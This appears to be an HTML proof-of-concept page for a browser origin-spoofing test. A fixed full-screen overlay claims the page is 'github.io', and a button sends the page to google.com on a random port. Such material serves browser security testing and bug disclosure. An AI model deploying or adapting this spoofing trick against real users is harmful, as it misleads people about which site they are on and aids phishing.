<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC Visual Origin Test</title>
<style>
  body { margin: 0; font-family: system-ui; }
  .spoof {
    position: fixed;
    inset: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 32px;
    background: white;
    z-index: 9999;
  }
  button {
    position: absolute;
    bottom: 50px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 20px;
    padding: 10px 20px;
  }
</style>
</head>
<body>

<div class="spoof">Origin A – github.io</div>

<button id="go">Navigate to Google</button>

<script>
document.getElementById('go').addEventListener('click', function() {
    // random port, sinkron, user gesture
    let randomPort;
    do {
        randomPort = Math.floor(Math.random() * 1000);
    } while (randomPort === 0 || randomPort === 443);

    // navigasi top-level langsung
    location.href = "https://google.com:" + randomPort + "/";
});
</script>

</body>
</html>
